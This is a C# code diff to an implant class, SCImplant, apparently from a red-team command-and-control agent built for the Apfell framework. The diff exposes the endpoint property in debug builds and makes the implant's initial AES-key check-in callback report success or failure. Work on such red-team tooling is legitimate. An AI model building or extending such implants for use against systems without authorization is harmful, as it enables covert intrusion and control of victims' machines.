@@ -48,7 +48,11 @@ namespace SaltedCaramel
     public class SCImplant
     {
         internal string callbackId { get; set; }
+#if (DEBUG)
+        public string endpoint { get; set; }
+#else
         internal string endpoint { get; set; }
+#endif
         public string host { get; set; }
         public string ip { get; set; }
         public int pid { get; set; }
@@ -115,7 +119,7 @@ namespace SaltedCaramel
         /// Send initial implant callback, different from normal task response
         /// because we need to get the implant ID from Apfell server
         /// </summary>
-        public void InitializeImplant()
+        public bool InitializeImplant()
         {
             string initEndpoint = this.endpoint + "crypto/aes_psk/" + this.uuid;
             this.retry = 0;
@@ -139,7 +143,7 @@ namespace SaltedCaramel
                     Debug.WriteLine($"[-] InitializeImplant - INITIALIZE RESPONSE: {callbackStatus}");
                     Debug.WriteLine($"[-] InitializeImplant - Callback ID is: {this.callbackId}");
                     retry = 0;
-                    return;
+                    return true;
                 }
                 else
                 {
@@ -157,6 +161,7 @@ namespace SaltedCaramel
             catch (Exception e) // Catch exceptions from HTTP request
             {
                 Debug.WriteLine(e.Message);
+                return false;
             }
         }
 
